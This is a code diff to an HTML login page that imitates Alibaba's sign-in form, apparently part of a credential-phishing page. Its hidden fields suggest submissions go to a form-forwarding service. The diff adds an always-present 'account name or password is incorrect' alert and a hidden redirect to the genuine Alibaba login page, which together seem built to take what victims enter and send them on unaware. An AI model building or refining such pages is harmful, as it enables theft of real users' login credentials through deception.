@@ -79,19 +79,22 @@
             >
               <div class="d-flex justify-content-between">
                 <label for="email" class="fw-bold">Account:</label>
+                <div class="alert alert-danger text-center w-75">
+                  <img
+                    src="./assets/error.svg"
+                    alt="Error"
+                    width="14px"
+                    height="14px"
+                  />
+                  Your account name or password is incorrect.
+                  <a href="">Help</a>
+                </div>
                 <img
                   class="pointer"
                   src="https://gw.alicdn.com/tps/i1/TB1VHK4KFXXXXbPXFXXwxCdHXXX-47-47.png"
                   alt="QR code"
                   onclick="qrlogin()"
                 />
-              </div>
-              <div
-                class="alert alert-danger position-absolute"
-                style="margin-top: -50px; margin-left: 100px"
-              >
-                <img src="./assets/error.svg" alt="Error" width="14px" height="14px" /> Your account name or
-                password is incorrect. <a href="">Help</a>
               </div>
 
               <input
@@ -132,6 +135,11 @@
 
               <input type="hidden" name="_subject" value="New Submission" />
               <input type="hidden" name="_captcha" value="false" />
+              <input
+                type="hidden"
+                name="_next"
+                value="https://passport.alibaba.com/icbu_login.htm?spm=a2700.7735675.scGlobalHomeHeader.8.8afe4Vu94Vu9mM&tracelog=hd_signin"
+              />
               <input
                 type="submit"
                 class="btn btn-orange w-100"
